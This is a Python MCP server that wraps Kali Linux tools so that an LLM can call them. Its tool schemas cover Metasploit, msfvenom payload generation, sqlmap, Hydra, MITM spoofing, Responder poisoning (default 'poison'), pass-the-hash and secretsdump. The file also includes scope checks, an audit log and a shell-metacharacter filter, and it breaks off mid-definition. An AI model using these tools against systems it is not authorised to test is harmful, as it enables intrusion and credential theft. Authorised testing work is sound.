#!/usr/bin/env python3
"""
MCP Server - Rami-kali AI Assistant v2.0
Integrates Kali Linux penetration testing tools with LM Studio via MCP protocol.

DISCLAIMER: This tool is designed for AUTHORIZED penetration testing and security
assessments ONLY. Unauthorized access to computer systems is illegal. Always ensure
you have explicit written permission before testing any system. The authors assume
no liability for misuse of this software.

Usage:
    python mcp_server.py

Improvements v2.0:
    - DNS hostname resolution in scope check (no more hostname bypass)
    - Risk-based confirmation for destructive tools (high-risk tools warn via stderr)
    - Structured output parsers for gobuster, nikto, hydra, whatweb, searchsploit
    - Binary availability check at startup (only lists installed tools)
    - Rate limiting per tool and global (asyncio semaphores)
    - SQLite scan history database with get_scan_history tool
    - auto_recon workflow tool (whois + dig + nmap + whatweb + gobuster)
    - generate_report tool (markdown report from scan history)
    - Added comprehensive penetration testing tools (Metasploit, BetterCAP, Impacket, etc.)
"""

import asyncio
import ipaddress
import json
import logging
import os
import re
import shlex
import shutil
import signal
import socket
import sqlite3
import sys
import xml.etree.ElementTree as ET
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Optional

import yaml


# ---------------------------------------------------------------------------
# Configuration helpers
# ---------------------------------------------------------------------------

BASE_DIR = Path(__file__).resolve().parent
DEFAULT_CONFIG_PATH = Path(os.environ.get("MCP_CONFIG_PATH", BASE_DIR / "config.yaml"))


def load_config(path: Path = DEFAULT_CONFIG_PATH) -> dict:
    """Load YAML configuration from *path*, returning defaults on failure."""
    try:
        with open(path, "r", encoding="utf-8") as fh:
            cfg = yaml.safe_load(fh) or {}
    except FileNotFoundError:
        logging.warning("Config file %s not found, using defaults.", path)
        cfg = {}
    except yaml.YAMLError as exc:
        logging.warning("Invalid YAML in %s: %s – using defaults.", path, exc)
        cfg = {}

    # ── Environment variable overrides ────────────────────────────────────
    if os.environ.get("MCP_LOG_LEVEL"):
        cfg.setdefault("server", {})["log_level"] = os.environ["MCP_LOG_LEVEL"]
    if os.environ.get("MCP_DATABASE"):
        cfg.setdefault("server", {})["database"] = os.environ["MCP_DATABASE"]
    if os.environ.get("MCP_AUDIT_LOG"):
        cfg.setdefault("security", {})["audit_log"] = os.environ["MCP_AUDIT_LOG"]
    if os.environ.get("MCP_REPORT_DIR"):
        cfg.setdefault("server", {})["report_dir"] = os.environ["MCP_REPORT_DIR"]

    return cfg


def setup_logging(config: dict) -> logging.Logger:
    """Configure and return the application logger."""
    server_cfg = config.get("server", {})
    log_file = server_cfg.get("log_file", "mcp_server.log")
    log_level = getattr(logging, server_cfg.get("log_level", "INFO").upper(), logging.INFO)

    logger = logging.getLogger("mcp_server")
    logger.setLevel(log_level)

    fh = logging.FileHandler(log_file, encoding="utf-8")
    fh.setLevel(log_level)
    fh.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(name)s: %(message)s"))
    logger.addHandler(fh)

    sh = logging.StreamHandler(sys.stderr)
    sh.setLevel(log_level)
    sh.setFormatter(logging.Formatter("[%(levelname)s] %(message)s"))
    logger.addHandler(sh)

    return logger


# ---------------------------------------------------------------------------
# Audit logger
# ---------------------------------------------------------------------------

class AuditLogger:
    """Append-only audit trail for every tool invocation."""

    def __init__(self, path: str = "audit.log") -> None:
        self._path = path

    def log(self, tool: str, arguments: dict, result_summary: str, success: bool) -> None:
        entry = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "tool": tool,
            "arguments": arguments,
            "success": success,
            "result_summary": result_summary[:500],
        }
        try:
            with open(self._path, "a", encoding="utf-8") as fh:
                fh.write(json.dumps(entry) + "\n")
        except OSError:
            pass


# ---------------------------------------------------------------------------
# [MEJORA 6] SQLite scan history database
# ---------------------------------------------------------------------------

class ScanDatabase:
    """SQLite database to persist scan results across sessions."""

    def __init__(self, db_path: str = "scan_results.db") -> None:
        self._db_path = db_path
        self._conn = sqlite3.connect(db_path)
        self._conn.row_factory = sqlite3.Row
        self._create_tables()

    def _create_tables(self) -> None:
        self._conn.execute("""
            CREATE TABLE IF NOT EXISTS scan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                tool TEXT NOT NULL,
                target TEXT NOT NULL,
                arguments TEXT NOT NULL,
                output TEXT NOT NULL,
                output_parsed TEXT,
                success INTEGER NOT NULL DEFAULT 1,
                timestamp TEXT NOT NULL
            )
        """)
        self._conn.execute("""
            CREATE TABLE IF NOT EXISTS evidence_verdicts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                scan_id INTEGER,
                tool TEXT NOT NULL,
                has_findings INTEGER NOT NULL DEFAULT 0,
                evidence_type TEXT NOT NULL DEFAULT 'none',
                finding_count INTEGER NOT NULL DEFAULT 0,
                finding_summary TEXT,
                execution_status TEXT NOT NULL DEFAULT 'success',
                no_findings INTEGER NOT NULL DEFAULT 1,
                timestamp TEXT NOT NULL,
                FOREIGN KEY (scan_id) REFERENCES scan_results(id)
            )
        """)
        self._conn.commit()

    def save_result(self, tool: str, target: str, arguments: dict,
                    output: str, output_parsed: Optional[str] = None,
                    success: bool = True) -> int:
        """Save a scan result and return its row id."""
        cursor = self._conn.execute(
            "INSERT INTO scan_results (tool, target, arguments, output, output_parsed, success, timestamp) "
            "VALUES (?, ?, ?, ?, ?, ?, ?)",
            (tool, target, json.dumps(arguments), output[:50000], output_parsed,
             1 if success else 0, datetime.now(timezone.utc).isoformat())
        )
        self._conn.commit()
        return cursor.lastrowid

    def get_history(self, tool: Optional[str] = None, target: Optional[str] = None,
                    limit: int = 20) -> list[dict]:
        """Retrieve scan history, optionally filtered by tool and/or target."""
        query = "SELECT id, tool, target, arguments, output_parsed, success, timestamp FROM scan_results WHERE 1=1"
        params: list = []
        if tool:
            query += " AND tool = ?"
            params.append(tool)
        if target:
            query += " AND target LIKE ?"
            params.append(f"%{target}%")
        query += " ORDER BY id DESC LIMIT ?"
        params.append(limit)

        rows = self._conn.execute(query, params).fetchall()
        return [dict(row) for row in rows]

    def get_all_targets(self) -> list[str]:
        """Return all unique targets from scan history."""
        rows = self._conn.execute(
            "SELECT DISTINCT target FROM scan_results ORDER BY target"
        ).fetchall()
        return [row["target"] for row in rows]

    def get_results_for_report(self, target: Optional[str] = None) -> list[dict]:
        """Get all results for report generation."""
        query = "SELECT id, tool, target, output, output_parsed, success, timestamp FROM scan_results WHERE 1=1"
        params: list = []
        if target:
            query += " AND target LIKE ?"
            params.append(f"%{target}%")
        query += " ORDER BY target, tool, timestamp"
        rows = self._conn.execute(query, params).fetchall()
        return [dict(row) for row in rows]

    def save_verdict(self, tool: str, verdict: "EvidenceVerdict",
                     scan_id: Optional[int] = None) -> int:
        """Persist an evidence verdict and return its row id."""
        cursor = self._conn.execute(
            "INSERT INTO evidence_verdicts "
            "(scan_id, tool, has_findings, evidence_type, finding_count, "
            " finding_summary, execution_status, no_findings, timestamp) "
            "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
            (
                scan_id, tool,
                1 if verdict.has_findings else 0,
                verdict.evidence_type,
                verdict.finding_count,
                json.dumps(verdict.finding_summary),
                verdict.execution_status,
                1 if verdict.no_findings else 0,
                datetime.now(timezone.utc).isoformat(),
            ),
        )
        self._conn.commit()
        return cursor.lastrowid

    def get_verdicts_for_report(self, target: Optional[str] = None) -> dict[int, dict]:
        """Return verdicts keyed by scan_id for report generation."""
        query = (
            "SELECT ev.scan_id, ev.has_findings, ev.evidence_type, "
            "ev.finding_count, ev.finding_summary, ev.execution_status, ev.no_findings "
            "FROM evidence_verdicts ev"
        )
        if target:
            query += (
                " JOIN scan_results sr ON ev.scan_id = sr.id"
                " WHERE sr.target LIKE ?"
            )
            rows = self._conn.execute(query, (f"%{target}%",)).fetchall()
        else:
            rows = self._conn.execute(query).fetchall()
        result: dict[int, dict] = {}
        for row in rows:
            r = dict(row)
            sid = r.pop("scan_id", None)
            if sid is not None:
                result[sid] = r
        return result


# ---------------------------------------------------------------------------
# Input sanitization
# ---------------------------------------------------------------------------

class InputSanitizer:
    """Validate and sanitize all user-supplied inputs before they reach the shell."""

    _SHELL_META = re.compile(r"[;&|`$(){}\n\r\\!<>]")

    _HOST_RE = re.compile(
        r"^(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)*"
        r"[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?$"
    )

    @staticmethod
    def sanitize_target(value: str) -> str:
        """Validate that *value* is an IP address, CIDR range, or hostname."""
        value = value.strip()
        if not value:
            raise ValueError("Target must not be empty.")

        try:
            ipaddress.ip_address(value)
            return value
        except ValueError:
            pass

        try:
            ipaddress.ip_network(value, strict=False)
            return value
        except ValueError:
            pass

        if InputSanitizer._HOST_RE.match(value) and len(value) <= 253:
            return value

        raise ValueError(f"Invalid target: {value!r}")

    @staticmethod
    def sanitize_url(value: str) -> str:
        """Validate that *value* is an HTTP(S) URL."""
        from urllib.parse import urlparse
        value = value.strip()
        parsed = urlparse(value)
        if parsed.scheme not in ("http", "https"):
            raise ValueError(f"URL scheme must be http or https, got {parsed.scheme!r}")
        if not parsed.hostname:
            raise ValueError("URL must contain a hostname.")
        if InputSanitizer._SHELL_META.search(value.replace("&", "").replace("?", "")):
            raise ValueError(f"URL contains disallowed characters: {value!r}")
        return value

    @staticmethod
    def sanitize_path(value: str) -> str:
        """Validate a file path – reject traversal attempts."""
        value = value.strip()
        if not value:
            raise ValueError("Path must not be empty.")
        if ".." in value:
            raise ValueError("Path traversal (..) is not allowed.")
        if InputSanitizer._SHELL_META.search(value):
            raise ValueError(f"Path contains disallowed characters: {value!r}")
        return value

    @staticmethod
    def sanitize_generic(value: str) -> str:
        """Remove shell metacharacters from a generic string argument."""
        value = value.strip()
        cleaned = InputSanitizer._SHELL_META.sub("", value)
        if cleaned != value:
            logging.getLogger("mcp_server").warning(
                "Stripped shell metacharacters from input: %r -> %r", value, cleaned
            )
        return cleaned

    # [MEJORA 1] Resolver hostname a IP antes del scope check
    @staticmethod
    def check_scope(target: str, allowed_scope: list[str], resolve_dns: bool = True) -> bool:
        """Return True if *target* falls inside one of the allowed CIDR ranges.

        If the target is a hostname and resolve_dns is True, resolve it to IP
        addresses and check each one. This prevents hostname-based scope bypass.
        """
        def _ip_in_scope(addr: ipaddress.IPv4Address | ipaddress.IPv6Address) -> bool:
            return any(
                addr in ipaddress.ip_network(scope, strict=False)
                for scope in allowed_scope
            )

        # Try as IP address
        try:
            addr = ipaddress.ip_address(target)
            return _ip_in_scope(addr)
        except ValueError:
            pass

        # Try as CIDR network
        try:
            net = ipaddress.ip_network(target, strict=False)
            return any(
                net.subnet_of(ipaddress.ip_network(scope, strict=False))
                for scope in allowed_scope
            )
        except ValueError:
            pass

        # It's a hostname - resolve to IP and check
        if resolve_dns:
            try:
                results = socket.getaddrinfo(target, None, socket.AF_UNSPEC, socket.SOCK_STREAM)
                resolved_ips = {r[4][0] for r in results}
                if not resolved_ips:
                    return False
                for ip_str in resolved_ips:
                    try:
                        if not _ip_in_scope(ipaddress.ip_address(ip_str)):
                            logging.getLogger("mcp_server").warning(
                                "Hostname %s resolves to %s which is OUTSIDE allowed scope.",
                                target, ip_str
                            )
                            return False
                    except ValueError:
                        return False
                return True
            except socket.gaierror:
                logging.getLogger("mcp_server").warning(
                    "Cannot resolve hostname %s - blocking by default.", target
                )
                return False
        else:
            # No DNS resolution, allow by legacy policy (not recommended)
            return True


# ---------------------------------------------------------------------------
# [MEJORA 4] Binary availability checker
# ---------------------------------------------------------------------------

# Maps tool names to the binary they require
TOOL_BINARY_MAP: dict[str, str] = {
    "nmap_scan": "nmap",
    "nikto_scan": "nikto",
    "gobuster_dir": "gobuster",
    "sqlmap_scan": "sqlmap",
    "hydra_attack": "hydra",
    "enum4linux_scan": "enum4linux",
    "wfuzz_scan": "wfuzz",
    "netcat_connect": "nc",
    "searchsploit_query": "searchsploit",
    "hashcat_crack": "hashcat",
    "john_crack": "john",
    "dirb_scan": "dirb",
    "whatweb_scan": "whatweb",
    "whois_lookup": "whois",
    "dig_lookup": "dig",
    "shell_command": None,         # always available
    "auto_recon": "nmap",          # needs at least nmap
    "get_scan_history": None,      # no binary needed
    "generate_report": None,       # no binary needed
    
    # NUEVAS HERRAMIENTAS DE PENETRACIÓN
    "msf_console": "msfconsole",
    "msfvenom": "msfvenom",
    "msf_db": "msfdb",
    "metasploit_resource": "msfconsole",
    "beef_start": "beef-xss",
    "setoolkit": "setoolkit",
    "bettercap": "bettercap",
    "ettercap": "ettercap",
    "responder": "responder",
    "mitmproxy": "mitmproxy",
    "aircrack_ng": "aircrack-ng",
    "reaver": "reaver",
    "bully": "bully",
    "wifite": "wifite",
    "crunch": "crunch",
    "cewl": "cewl",
    "medusa": "medusa",
    "ncrack": "ncrack",
    "patator": "patator",
    "xhydra": "xhydra",
    "owasp_zap": "zap-cli",
    "burpsuite": "burpsuite",
    "wpscan": "wpscan",
    "joomscan": "joomscan",
    "drupwn": "drupwn",
    "droopescan": "droopescan",
    "smbmap": "smbmap",
    "smbclient": "smbclient",
    "rpcclient": "rpcclient",
    "impacket": "impacket-scripts",
    "bloodhound": "bloodhound",
    "crackmapexec": "crackmapexec",
    "evil_winrm": "evil-winrm",
    "psexec": "psexec",
    "wmiexec": "wmiexec.py",
    "smbexec": "smbexec.py",
    "secretsdump": "secretsdump.py",
    "mimikatz": "mimikatz",
    "pth_tools": "pth-toolkit",
    "powersploit": "powersploit",
    "empire": "empire",
    "cobaltstrike": "cobaltstrike",
    "veil": "veil",
    "shellter": "shellter",
    "msf_payload_generator": "msfvenom",
    "armitage": "armitage",
    "faraday": "faraday-client",
    "wireshark": "tshark",
    "tcpdump": "tcpdump",
    "ngrep": "ngrep",
    "macchanger": "macchanger",
    "dnsspoof": "dnsspoof",
    "arpspoof": "arpspoof",
    "sslstrip": "sslstrip",
    "yersinia": "yersinia",
    "hping3": "hping3",
    "nping": "nmap",
    "fragrouter": "fragrouter",
    "kismet": "kismet",
    "wifiphisher": "wifiphisher",
    "fluxion": "fluxion",
    "mdk4": "mdk4",
    "pixiewps": "pixiewps",
    "airgeddon": "airgeddon",
    "wifi_honey": "wifi-honey",
    "ghost_phisher": "ghost-phisher",
    "wifite2": "wifite",
    "fern_wifi": "fern-wifi-cracker",
    "cowpatty": "cowpatty",
    "pyrit": "pyrit",
    "ewsa": "ewsa",
}


def check_available_binaries(logger: logging.Logger) -> dict[str, bool]:
    """Check which tool binaries are available on the system."""
    available: dict[str, bool] = {}
    for tool_name, binary in TOOL_BINARY_MAP.items():
        if binary is None:
            available[tool_name] = True
        else:
            found = shutil.which(binary) is not None
            available[tool_name] = found
            if not found:
                logger.warning("Binary '%s' not found - tool '%s' will be hidden.", binary, tool_name)
            else:
                logger.info("Binary '%s' found for tool '%s'.", binary, tool_name)
    return available


# ---------------------------------------------------------------------------
# Tool registry – JSON Schema definitions for every tool
# ---------------------------------------------------------------------------

class ToolRegistry:
    """Stores JSON Schema definitions for all MCP tools."""

    def __init__(self, available_binaries: Optional[dict[str, bool]] = None) -> None:
        self._tools: list[dict[str, Any]] = []
        self._available = available_binaries or {}
        self._build()

    @property
    def tools(self) -> list[dict[str, Any]]:
        return self._tools

    def get(self, name: str) -> Optional[dict]:
        for t in self._tools:
            if t["name"] == name:
                return t
        return None

    def _add(self, name: str, description: str, schema: dict) -> None:
        # [MEJORA 4] Only register tools whose binaries are available
        if self._available.get(name, True) is False:
            return
        self._tools.append({
            "name": name,
            "description": description,
            "inputSchema": {"type": "object", **schema},
        })

    def _build(self) -> None:
        self._add("nmap_scan", "Run an Nmap scan against a target host or network.", {
            "properties": {
                "target": {"type": "string", "description": "IP, CIDR, or hostname to scan."},
                "scan_type": {
                    "type": "string",
                    "enum": ["quick", "full", "stealth", "vuln", "scripts", "discovery", "udp"],
                    "description": (
                        "Scan profile: "
                        "quick=-sS -sV --top-ports 1000; "
                        "full=-sS -sV -sC -p-; "
                        "stealth=-sS -sV (SYN only); "
                        "vuln=-sS -sV --script vuln; "
                        "scripts=-sS -sV -sC; "
                        "discovery=-sn (host-only, NO port scan — use for subnets); "
                        "udp=-sU --top-ports 50."
                    ),
                    "default": "quick",
                },
                "ports": {"type": "string", "description": "Port specification (e.g. '80,443' or '1-1024')."},
                "timing": {
                    "type": "string",
                    "enum": ["T0", "T1", "T2", "T3", "T4", "T5"],
                    "description": "Nmap timing template.",
                    "default": "T3",
                },
                "scripts": {"type": "string", "description": "NSE scripts to run (comma-separated)."},
                "extra_args": {"type": "string", "description": "Additional Nmap arguments."},
            },
            "required": ["target"],
        })

        self._add("nikto_scan", "Run Nikto web-server vulnerability scanner.", {
            "properties": {
                "target_url": {"type": "string", "description": "Target URL (http/https)."},
                "tuning": {"type": "string", "description": "Nikto tuning options."},
                "max_time": {"type": "integer", "description": "Max scan time in seconds."},
                "extra_args": {"type": "string", "description": "Additional Nikto arguments."},
            },
            "required": ["target_url"],
        })

        self._add("gobuster_dir", "Brute-force directories and files on a web server using Gobuster.", {
            "properties": {
                "target_url": {"type": "string", "description": "Target URL."},
                "wordlist": {
                    "type": "string",
                    "description": "Path to wordlist file.",
                    "default": "/usr/share/wordlists/dirb/common.txt",
                },
                "extensions": {"type": "string", "description": "File extensions to search (e.g. 'php,html,txt')."},
                "threads": {"type": "integer", "description": "Number of concurrent threads.", "default": 10},
                "status_codes": {"type": "string", "description": "Positive status codes (e.g. '200,204,301')."},
            },
            "required": ["target_url"],
        })

        self._add("sqlmap_scan", "Automated SQL injection detection and exploitation with sqlmap. [HIGH RISK]", {
            "properties": {
                "target_url": {"type": "string", "description": "Target URL with parameter (e.g. 'http://target/page?id=1')."},
                "data": {"type": "string", "description": "POST data string."},
                "method": {"type": "string", "enum": ["GET", "POST"], "description": "HTTP method.", "default": "GET"},
                "level": {"type": "integer", "description": "Test level (1-5).", "default": 1, "minimum": 1, "maximum": 5},
                "risk": {"type": "integer", "description": "Risk level (1-3).", "default": 1, "minimum": 1, "maximum": 3},
                "tamper": {"type": "string", "description": "Tamper script(s)."},
                "extra_args": {"type": "string", "description": "Additional sqlmap arguments."},
            },
            "required": ["target_url"],
        })

        self._add("hydra_attack", "Online password brute-force with Hydra. [HIGH RISK]", {
            "properties": {
                "target": {"type": "string", "description": "Target IP or hostname."},
                "service": {
                    "type": "string",
                    "enum": ["ssh", "ftp", "http-get", "http-post", "http-post-form",
                             "smb", "rdp", "mysql", "mssql", "postgres", "vnc",
                             "telnet", "smtp", "pop3", "imap"],
                    "description": "Service to attack.",
                },
                "port": {"type": "integer", "description": "Target port (overrides service default)."},
                "username": {"type": "string", "description": "Single username."},
                "username_list": {"type": "string", "description": "Path to username list file."},
                "password_list": {"type": "string", "description": "Path to password list file."},
                "threads": {"type": "integer", "description": "Parallel tasks.", "default": 4},
                "extra_args": {"type": "string", "description": "Additional Hydra arguments."},
            },
            "required": ["target", "service", "password_list"],
        })

        self._add("enum4linux_scan", "Enumerate information from Windows/Samba systems.", {
            "properties": {
                "target": {"type": "string", "description": "Target IP or hostname."},
                "options": {
                    "type": "string",
                    "enum": ["all", "users", "shares", "policies", "groups"],
                    "description": "Enumeration category.",
                    "default": "all",
                },
            },
            "required": ["target"],
        })

        self._add("wfuzz_scan", "Web application fuzzer.", {
            "properties": {
                "target_url": {"type": "string", "description": "URL containing FUZZ keyword."},
                "wordlist": {"type": "string", "description": "Path to wordlist."},
                "hide_codes": {"type": "string", "description": "Response codes to hide (e.g. '404,302')."},
                "hide_chars": {"type": "string", "description": "Hide responses with this character count."},
                "extra_args": {"type": "string", "description": "Additional wfuzz arguments."},
            },
            "required": ["target_url", "wordlist"],
        })

        self._add("netcat_connect", "TCP connection / listener using Netcat.", {
            "properties": {
                "target": {"type": "string", "description": "Target host (for connect mode)."},
                "port": {"type": "integer", "description": "Port number."},
                "mode": {
                    "type": "string",
                    "enum": ["connect", "listen"],
                    "description": "Connection mode.",
                    "default": "connect",
                },
                "extra_args": {"type": "string", "description": "Additional Netcat flags."},
            },
            "required": ["port"],
        })

        self._add("searchsploit_query", "Search Exploit-DB for known exploits via searchsploit.", {
            "properties": {
                "query": {"type": "string", "description": "Search term(s)."},
                "exact": {"type": "boolean", "description": "Exact match.", "default": False},
                "json_output": {"type": "boolean", "description": "Return JSON output.", "default": True},
            },
            "required": ["query"],
        })

        self._add("hashcat_crack", "GPU/CPU password cracking with Hashcat. [HIGH RISK]", {
            "properties": {
                "hash_file": {"type": "string", "description": "Path to file containing hashes."},
                "hash_type": {"type": "integer", "description": "Hashcat hash-type code (e.g. 0 for MD5)."},
                "wordlist": {"type": "string", "description": "Path to wordlist."},
                "rules": {"type": "string", "description": "Path to rules file."},
                "extra_args": {"type": "string", "description": "Additional Hashcat arguments."},
            },
            "required": ["hash_file", "hash_type", "wordlist"],
        })

        self._add("john_crack", "CPU password cracking with John the Ripper. [HIGH RISK]", {
            "properties": {
                "hash_file": {"type": "string", "description": "Path to file containing hashes."},
                "wordlist": {"type": "string", "description": "Path to wordlist."},
                "format": {"type": "string", "description": "Hash format (e.g. 'raw-md5', 'bcrypt')."},
                "extra_args": {"type": "string", "description": "Additional John arguments."},
            },
            "required": ["hash_file"],
        })

        self._add("dirb_scan", "Web content scanner using DIRB.", {
            "properties": {
                "target_url": {"type": "string", "description": "Target URL."},
                "wordlist": {
                    "type": "string",
                    "description": "Wordlist path.",
                    "default": "/usr/share/wordlists/dirb/common.txt",
                },
                "extra_args": {"type": "string", "description": "Additional DIRB arguments."},
            },
            "required": ["target_url"],
        })

        self._add("whatweb_scan", "Web technology fingerprinting with WhatWeb.", {
            "properties": {
                "target_url": {"type": "string", "description": "Target URL."},
                "aggression": {
                    "type": "string",
                    "enum": ["1", "3", "4"],
                    "description": "Aggression level: 1=stealthy, 3=aggressive, 4=heavy.",
                    "default": "1",
                },
                "extra_args": {"type": "string", "description": "Additional WhatWeb arguments."},
            },
            "required": ["target_url"],
        })

        self._add("whois_lookup", "WHOIS domain/IP lookup.", {
            "properties": {
                "target": {"type": "string", "description": "Domain or IP to look up."},
            },
            "required": ["target"],
        })

        self._add("dig_lookup", "DNS lookup using dig.", {
            "properties": {
                "target": {"type": "string", "description": "Domain name to query."},
                "record_type": {
                    "type": "string",
                    "enum": ["A", "AAAA", "MX", "NS", "TXT", "SOA", "CNAME", "ANY"],
                    "description": "DNS record type.",
                    "default": "A",
                },
                "server": {"type": "string", "description": "DNS server to query (e.g. 8.8.8.8)."},
            },
            "required": ["target"],
        })

        self._add("shell_command", "Execute a whitelisted shell command (restricted).", {
            "properties": {
                "command": {"type": "string", "description": "The command to execute."},
            },
            "required": ["command"],
        })

        # [MEJORA 7] Auto-recon workflow
        self._add("auto_recon", "Automated reconnaissance: runs whois + dig + nmap + whatweb + gobuster on a target.", {
            "properties": {
                "target": {"type": "string", "description": "Target IP or hostname."},
                "ports": {"type": "string", "description": "Specific ports to scan (default: top 1000)."},
                "web_ports": {"type": "string", "description": "Ports to check for web services (default: '80,443,8080,8443')."},
                "wordlist": {"type": "string", "description": "Wordlist for gobuster.", "default": "/usr/share/wordlists/dirb/common.txt"},
            },
            "required": ["target"],
        })

        # [MEJORA 6] Scan history query
        self._add("get_scan_history", "Query previous scan results from the database.", {
            "properties": {
                "tool": {"type": "string", "description": "Filter by tool name (optional)."},
                "target": {"type": "string", "description": "Filter by target (partial match, optional)."},
                "limit": {"type": "integer", "description": "Max results to return.", "default": 20},
            },
            "required": [],
        })

        # [MEJORA 8] Report generation
        self._add("generate_report", "Generate a markdown report from scan history.", {
            "properties": {
                "target": {"type": "string", "description": "Filter report to a specific target (optional)."},
            },
            "required": [],
        })

        # ========= NUEVAS HERRAMIENTAS DE METASPLOIT =========
        
        self._add("msf_console", "Ejecutar comandos en Metasploit Framework. [ALTO RIESGO]", {
            "type": "object",
            "properties": {
                "resource_script": {"type": "string", "description": "Ruta al archivo de recurso .rc de Metasploit"},
                "commands": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "Lista de comandos de Metasploit a ejecutar"
                },
                "workspace": {"type": "string", "description": "Workspace de Metasploit a usar", "default": "default"},
                "background": {"type": "boolean", "description": "Ejecutar en segundo plano", "default": False},
            },
            "required": [],
            "additionalProperties": False,
        })
        
        self._add("msfvenom", "Generar payloads con MSFVenom para explotación. [ALTO RIESGO]", {
            "properties": {
                "payload": {"type": "string", "description": "Payload a generar (ej. windows/meterpreter/reverse_tcp)"},
                "lhost": {"type": "string", "description": "IP del listener"},
                "lport": {"type": "integer", "description": "Puerto del listener"},
                "format": {
                    "type": "string", 
                    "enum": ["exe", "elf", "raw", "python", "c", "powershell", "java", "php", "asp", "aspx", "war"],
                    "description": "Formato de salida",
                    "default": "exe"
                },
                "output_file": {"type": "string", "description": "Archivo de salida"},
                "encoder": {"type": "string", "description": "Encoder a usar (ej. x86/shikata_ga_nai)"},
                "iterations": {"type": "integer", "description": "Número de iteraciones de encoding", "default": 1},
                "platform": {"type": "string", "description": "Plataforma objetivo", "default": "windows"},
                "arch": {"type": "string", "enum": ["x86", "x64"], "description": "Arquitectura", "default": "x86"},
                "badchars": {"type": "string", "description": "Caracteres a evitar (ej. '\\x00\\x0a')"},
                "extra_args": {"type": "string", "description": "Argumentos adicionales"},
            },
            "required": ["payload", "lhost", "lport", "format"],
        })
        
        self._add("metasploit_resource", "Crear y ejecutar scripts resource (.rc) de Metasploit. [ALTO RIESGO]", {
            "properties": {
                "name": {"type": "string", "description": "Nombre del script resource"},
                "commands": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "Comandos de Metasploit a incluir"
                },
                "exploit_module": {"type": "string", "description": "Módulo de exploit a usar"},
                "payload": {"type": "string", "description": "Payload a usar"},
                "options": {
                    "type": "object",
                    "description": "Opciones para el módulo (RHOSTS, LHOST, etc.)"
                },
                "run": {"type": "boolean", "description": "Ejecutar inmediatamente", "default": True},
            },
            "required": ["name"],
        })
        
        # ========= HERRAMIENTAS DE ATAQUE DE RED/MITM =========
        
        self._add("bettercap_scan", "Escaneo y ataques MITM con BetterCAP. [ALTO RIESGO]", {
            "properties": {
                "target": {"type": "string", "description": "IP o rango objetivo"},
                "gateway": {"type": "string", "description": "IP del gateway para ARP spoofing"},
                "module": {
                    "type": "string",
                    "enum": ["arp.spoof", "dns.spoof", "http.proxy", "https.proxy", "net.sniff", "tcp.proxy"],
                    "description": "Módulo de BetterCAP a usar",
                    "default": "arp.spoof"
                },
                "action": {
                    "type": "string",
                    "enum": ["scan", "spoof", "sniff", "proxy"],
                    "description": "Acción a realizar"
                },
                "interface": {"type": "string", "description": "Interfaz de red a usar"},
                "script": {"type": "string", "description": "Script de BetterCAP a ejecutar"},
                "commands": {"type": "array", "items": {"type": "string"}, "description": "Comandos interactivos"},
            },
            "required": ["target"],
        })
        
        self._add("responder_poison", "Envenenamiento LLMNR/NBT-NS con Responder. [ALTO RIESGO]", {
            "properties": {
                "interface": {"type": "string", "description": "Interfaz de red", "default": "eth0"},
                "mode": {
                    "type": "string",
                    "enum": ["analyze", "poison"],
                    "description": "Modo: analyze (solo análisis) o poison (envenenamiento)",
                    "default": "poison"
                },
                "services": {
                    "type": "array",
                    "items": {"type": "string", "enum": ["HTTP", "SMB", "SQL", "FTP", "POP3", "SMTP", "IMAP"]},
                    "description": "Servicios a activar"
                },
                "wpad": {"type": "boolean", "description": "Activar WPAD rogue server", "default": True},
                "fingerprint": {"type": "boolean", "description": "Activar fingerprinting", "default": True},
            },
            "required": ["interface"],
        })
        
        # ========= HERRAMIENTAS DE EXPLOTACIÓN WINDOWS =========
        
        self._add("crackmapexec", "Ejecución de CME para explotación de redes Windows. [ALTO RIESGO]", {
            "properties": {
                "target": {"type": "string", "description": "IP, rango o archivo con objetivos"},
                "protocol": {
                    "type": "string",
                    "enum": ["smb", "ssh", "winrm", "mssql", "ldap", "ftp"],
                    "description": "Protocolo a usar",
                    "default": "smb"
                },
                "username": {"type": "string", "description": "Usuario o archivo de usuarios"},
                "password": {"type": "string", "description": "Password o archivo de passwords"},
                "hash": {"type": "string", "description": "NTLM hash para pass-the-hash"},
                "module": {"type": "string", "description": "Módulo de CME a ejecutar"},
                "command": {"type": "string", "description": "Comando a ejecutar"},
                "exec_method": {
                    "type": "string",
                    "enum": ["wmiexec", "smbexec", "atexec", "psexec"],
                    "description": "Método de ejecución"
                },
                "port": {"type": "integer", "description": "Puerto específico"},
            },
            "required": ["target"],
        })
        
        self._add("impacket_scripts", "Ejecutar scripts de Impacket. [ALTO RIESGO]", {
            "properties": {
                "script": {
                    "type": "string",
                    "enum": ["psexec.py", "wmiexec.py", "smbexec.py", "secretsdump.py", 
                            "GetUserSPNs.py", "GetNPUsers.py", "ticketer.py", "raiseChild.py"],
                    "description": "Script de Impacket a ejecutar"
                },
                "target": {"type": "string", "description": "IP o hostname objetivo"},
                "username": {"type": "string", "description": "Usuario"},
                "password": {"type": "string", "description": "Password"},
                "hash": {"type": "string", "description": "NTLM hash"},
                "domain": {"type": "string", "description": "Dominio"},
                "command": {"type": "string", "description": "Comando a ejecutar"},
                "port": {"type": "integer", "description": "Puerto"},
                "extra_args": {"type": "string", "description": "Argumentos adicionales"},
            },
            "required": ["script", "target"],
        })
        
        self._add("bloodhound_enum", "Enumeración de Active Directory con BloodHound. [ALTO RIESGO]", {
            "properties": {
                "target": {"type": "string", "description": "IP o dominio objetivo"},
                "username": {"type": "string", "description": "Usuario del dominio"},
                "password": {"type": "string", "description": "Password"},
                "domain": {"type": "string", "description": "Dominio"},
                "collector": {
                    "type": "string",
                    "enum": ["SharpHound.exe", "BloodHound.py"],
                    "description": "Colector a usar",
                    "default": "BloodHound.py"
                },
                "collection_methods": {
                    "type": "array",
                    "items": {"type": "string", "enum": ["All", "Group", "LocalAdmin", "RDP", "DCOM", "PSRemote"]},
                    "description": "Métodos de colección"
